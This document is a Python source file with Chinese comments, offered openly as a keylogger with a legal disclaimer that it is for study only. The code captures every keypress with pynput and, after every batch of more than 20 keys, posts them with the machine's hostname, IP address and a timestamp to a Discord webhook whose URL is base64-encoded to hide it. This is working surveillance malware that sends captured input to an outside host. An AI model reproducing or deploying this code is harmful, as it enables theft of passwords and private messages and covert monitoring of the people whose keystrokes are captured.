# -*- coding: utf-8 -*-
# 导入必要的模块，并确保所有依赖都已满足
try:
    import base64  # 提供 base64 编码和解码功能
    import json    # 实现 Python 对象和 JSON 格式之间的转换
    import asyncio # 支持异步编程，实现非阻塞 I/O 操作
    import socket  # 提供网络相关操作，如获取 IP 地址
    import requests # 简化 HTTP 请求，使 API 交互更直观
    import logging  # 提供灵活的日志框架，用于调试和监控
    from datetime import (
        datetime,
    )  # 提供日期和时间功能，用于事件时间戳
    from pynput.keyboard import (
        Key,
        Listener,
    )  # 捕获键盘输入，用于记录按键
except ImportError as error:
    # 如果缺少任何必需的模块，抛出 ImportError 以指示缺少的依赖
    raise error
finally:
    # 打印问候消息，表示脚本已启动
    print("~你好~")

law: str = """
# ============================================================================
# @author 钟智强
# @email johnmelodymel@qq.com
# ============================================================================
# == 重要声明 ==
# ============================================================================
# 本程序仅供学习和技术研究使用，禁止将其用于任何未获授权的侵入、
# 攻击、监听、干扰或其他违反网络安全和隐私保护的行为。
#
# 使用者必须在**完全理解并同意上述条款**的前提下使用本程序。
# 任何将本程序用于**非法目的**的行为，其**所有后果**（包括但不限于
# 行政处罚、民事赔偿、刑事责任）**均由使用者自行承担**。
#
# 请务必遵守您所在国家和地区的相关法律法规，特别是以下中国法律条款：
#
# - 《中华人民共和国网络安全法》 第十二条：任何个人和组织不得利用网络
#   从事危害国家安全、荣誉和利益，煽动颠覆国家政权等违法犯罪活动。
# - 《中华人民共和国刑法》 第二百八十五条至第二百八十七条：
#   非法侵入计算机信息系统、破坏系统功能或数据的行为将被追究刑事责任。
# - 《中华人民共和国数据安全法》 第三条、第十七条：
#   从事数据处理活动应当依法保障数据安全，禁止非法获取、泄露数据。
#
# 💡特别提醒：本程序设计中可能涉及网络通信、数据收集、远程控制等功能，
# 均应在**授权范围内**使用，任何对设备、系统、数据的未经授权的访问或控制
# 都属于违法行为。
#
# 📛 违反以上条款造成的一切法律后果与责任，与作者无关。
"""

class Keylogger:
    """
    `Keylogger` 类用于监控和记录用户的键盘按键。
    记录的按键通过 webhook URL 发送到远程服务器。该类
    包含捕获键盘输入、编码和通过网络传输的功能。

    属性：
        pressed_keys (list): 存储用户按下的键
        url (str): 用于发送按键记录的 webhook URL，使用 base64 编码
                  进行混淆以防止轻易被发现
    """

    def __init__(self):
        """
        初始化 Keylogger 类，设置初始状态并解码
        base64 编码的 webhook URL。该 URL 用于发送捕获的
        按键到远程服务器。
        """
        # 初始化父类
        super(Keylogger, self).__init__()
        # 创建空列表存储按下的键
        self.pressed_keys = []

        print(law)

        """
        webhook URL 使用 base64 编码提供基本的混淆
        防止 URL 以明文形式轻易被读取。请务必
        将此 URL 替换为您自己的 webhook 端点，以确保数据
        发送到正确的位置。URL 应保密以避免未经授权的
        访问和监控。
        """
        # 解码 base64 编码的 webhook URL
        # 请更换为您自己的 webhook URL
        self.url = base64.b64decode(
            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3OTQwMjQ1NjQzMzgyMzgwNi9mX1FEN05hWHViOU5RSWlWajJVYU05VzEtMGN5RG12UGgzRmZYOUZFYjVJbDFOLTdfWnlva1pvUEFfU3kxeFlFd3d4bQ=="
        ).decode("utf-8")

    async def payload_to_server(self, message):
        """
        异步发送按键数据（负载）到指定的 webhook URL。

        此方法收集有关机器的信息，包括主机名、IP地址
        和当前时间戳。然后构造一个包含这些信息的JSON负载
        以及捕获的键盘输入。负载通过POST请求发送到服务器。

        这里是负载发送到服务器的地方：
        您可以将其替换为您自己的服务器的http请求

        :param message: 包含要发送到服务器的捕获按键的字符串。
        """
        # 获取机器的主机名和IP地址
        _machine_name_ = socket.gethostname()
        _ip_address_ = socket.gethostbyname(_machine_name_)
        # 获取当前时间用于时间戳记录
        _current_time_ = datetime.now().time()

        # 构造负载字典
        parameters = {
            "username": "Keylogger",  # 用于标识消息发送者的用户名
            "content": (  # 消息内容包括时间戳、机器信息和按键
                f"***************\n"
                f"Timestamp: {_current_time_}\n"  # 消息生成时间
                f"Machine Name: {_machine_name_}\n"  # 捕获按键的机器名称
                f"Current IP: {_ip_address_}\n"  # 机器的IP地址
                f"Keyboard Input: {message}\n"  # 实际捕获的按键
                f"***************"
            ),
        }

        # 尝试使用POST请求发送负载到服务器
        try:
            response = requests.post(
                self.url,
                headers={
                    "Content-Type": "application/json"
                },  # 设置内容类型为JSON
                data=json.dumps(
                    parameters
                ),  # 将参数字典转换为JSON字符串
            )
            # 记录响应状态码用于监控目的
            logging.info(f"Payload sent  {response.status_code}")
        except Exception as e:
            # 记录请求期间发生的任何异常以进行调试和错误跟踪
            logging.error(f"Failed to send payload: {e}")

    def log(self):
        """
        启动键盘记录器以监听键盘事件。此方法设置键盘
        监听器并等待捕获按键。

        监听器将在每次按键时调用`keyboard_pressed`方法。
        """
        # 创建键盘监听器，在按键事件时调用`keyboard_pressed`
        with Listener(on_press=self.keyboard_pressed) as listener:
            # 保持监听器无限运行
            listener.join()

    def keyboard_pressed(self, key):
        """
        按键时触发的回调函数。此方法记录按键，
        将其添加到已按键列表中，如果按键数量超过
        指定阈值，则将按键数据发送到服务器。

        :param key: 表示按下的键的键对象。
        """
        # 将按下的键添加到已按键列表
        self.pressed_keys.append(str(key))
        # 记录按键事件用于调试和监控
        logging.info(f"Keyboard Pressed => {str(key)}")

        # 如果按键数量超过20，发送数据到服务器
        if len(self.pressed_keys) > 20:
            # 使用asyncio异步运行`payload_to_server`方法
            asyncio.run(self.payload_to_server(str(self.pressed_keys)))
            # 发送数据到服务器后清空已按键列表
            self.pressed_keys.clear()


if __name__ == "__main__":
    # 配置日志系统以显示INFO级别的消息
    logging.basicConfig(level=logging.INFO)

    # 实例化Keylogger类
    keylogger = Keylogger()
    # 通过调用`log`方法开始记录按键
    keylogger.log()
